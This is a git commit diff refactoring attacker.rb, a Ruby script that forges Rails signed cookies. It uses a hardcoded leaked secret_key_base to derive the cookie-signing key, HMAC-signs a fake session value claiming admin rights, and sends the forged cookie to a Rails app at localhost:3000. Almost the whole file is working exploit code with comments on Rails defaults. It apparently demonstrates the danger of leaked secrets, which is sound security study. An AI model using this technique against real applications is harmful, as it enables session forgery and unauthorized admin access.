a4f9d926bf4ee3da7f55e7964e4b6201468fb4e8
Andres Sarnari <asarnari@Andress-MacBook-Pro.local>
2018-03-08 14:18:23 +1100

    Refactor message encoding and signing into a method

--- attacker.rb
+++ attacker.rb
@@ -8,8 +8,23 @@ require 'openssl'
 require 'active_support/all'
 
 LEAKED_BASE_SECRET = 'cdc8441f641f565e967a0786bd31c50be6e7ea790e17c26ab7083bcb00d9a301c86dcd89c9d8585471a6c28322238682b6f2b4dc79cd4aab8a2627961faed43a'.freeze
+# I think this value can be configured, if you can you'd have to go out of your
+# way to do so
 DEFAULT_SIGNED_COOKIE_SALT = 'signed cookie'.freeze
+# This value can't be configured, it's hardcoded in the Rails source
 RAILS_HARDCODED_KEY_GENERATOR_ITERATIONS = 1000
+
+def encode_and_sign(message, signing_secret:)
+  # The inner encoding scheme (in this case, JSON) is configurable in
+  #   config/initializers/cookies_serializer.rb
+  # It defaults to JSON for new rails apps
+  encoded_message = Base64.strict_encode64(ActiveSupport::JSON.encode(message))
+  # The digest scheme (here, SHA1) is configurable but defaults to SHA1.
+  signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get('SHA1').new,
+                                      signing_secret,
+                                      encoded_message)
+  "#{encoded_message}--#{signature}"
+end
 
 # uri = URI('http://localhost:3000/set-cookies')
 # response = Net::HTTP.get_response(uri)
@@ -32,17 +47,12 @@ key_generator = ActiveSupport::KeyGenerator.new(
 cookie_signing_secret = key_generator.generate_key(DEFAULT_SIGNED_COOKIE_SALT)
 
 malicious_value = 'faked session data making me admin'
-encoded_malicious_value = Base64.strict_encode64(
-  ActiveSupport::JSON.encode(malicious_value)
-)
-signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get('SHA1').new,
-                                    cookie_signing_secret,
-                                    encoded_malicious_value)
-malicious_cookie = "#{encoded_malicious_value}--#{signature}"
+malicious_cookie = encode_and_sign(malicious_value,
+                                   signing_secret: cookie_signing_secret)
 
 uri = URI('http://localhost:3000/show-cookies')
 malicious_request = Net::HTTP::Get.new(uri)
-malicious_request['Cookie'] = "plain=basic+check; signed=#{malicious_cookie}"
+malicious_request['Cookie'] = "signed=#{malicious_cookie}"
 
 response = nil
 Net::HTTP.start(uri.host, uri.port) do |http|
